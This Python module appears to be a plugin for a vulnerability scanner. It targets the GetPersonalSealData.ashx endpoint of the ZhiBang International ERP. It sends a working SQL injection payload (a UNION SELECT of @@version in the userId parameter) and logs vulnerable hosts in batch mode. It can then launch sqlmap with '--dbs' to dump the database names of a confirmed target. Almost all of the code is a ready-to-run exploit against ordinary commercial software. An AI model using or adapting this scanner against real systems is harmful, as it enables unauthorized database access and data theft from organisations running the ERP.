# body="./images/lg_05_1.gif"
import requests,urllib3
from pub.com.outprint import OutPrintInfo,OutPrintInfoErr,OutPrintInfoSuc
from pub.com.reqset import ReqSet
from rich.prompt import Prompt
from pub.com.output import OutPutFile
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class ZhiBangGuoJi_Sql_Scan:
	def scan(self,baseurl):
		url=baseurl+"/SYSN/json/pcclient/GetPersonalSealData.ashx?imageDate=1&userId=-1%20union%20select%20@@version--"
		try:
			response = requests.get(url=url,headers=self.headers,verify=self.ssl,proxies=self.proxy,timeout=15)
			if "SQL" in response.text and response.status_code == 200:
				if not self.batch:
					OutPrintInfoSuc("智邦国际ERP","存在智邦国际ERP GetPersonalSealData.ashx接口SQL注入漏洞")
					OutPrintInfo("智邦国际ERP",url)
				else:
					OutPrintInfoSuc("智邦国际ERP", f"存在SQL注入漏洞 {url}")
					OutPutFile("zhibangguoji_sql.txt",f"存在SQL注入漏洞 {url}")
				return True
			else:
				if not self.batch:
					OutPrintInfo("智邦国际ERP","不存在智邦国际ERP GetPersonalSealData.ashx接口SQL注入漏洞")
				return False
		except Exception:
			if not self.batch:
				OutPrintInfo("智邦国际ERP", "目标请求出错")
			return False




	def main(self,target):
		self.batch = target["batch_work"]
		url = target["url"].strip('/ ')
		self.ssl = target["ssl"]
		header = target["header"]
		proxy = target["proxy"]
		self.headers, self.proxy = ReqSet(header=header, proxy=proxy, bwork=self.batch)
		if not self.batch:
			OutPrintInfo("智邦国际ERP", '开始检测智邦国际ERP GetPersonalSealData.ashx接口SQL注入漏洞...')

		if self.scan(url):
			if not self.batch:
				choose = Prompt.ask("[b yellow]是否调用sqlmap([b bright_red]y/n[/b bright_red])")
				if choose == "y":
					import os
					dir = os.getcwd()
					baseurl = url + "/SYSN/json/pcclient/GetPersonalSealData.ashx?imageDate=1&userId=1"
					q = f"-u \"{baseurl}\""
					try:
						OutPrintInfo("SqlMap","sqlmap启动...")
						OutPrintInfo("SqlMap",
									 f"[b bright_red]Query[/b bright_red]: \n[b magenta]sqlmap {q} --dbs --output-dir={dir}/result/ --batch")
						os.system(f"sqlmap {q} --dbs --output-dir={dir}/result/ --batch")
					except Exception as e:
						OutPrintInfoErr(e)

		if not self.batch:
			OutPrintInfo("智邦国际ERP", '智邦国际ERP GetPersonalSealData.ashx接口SQL注入漏洞检测结束')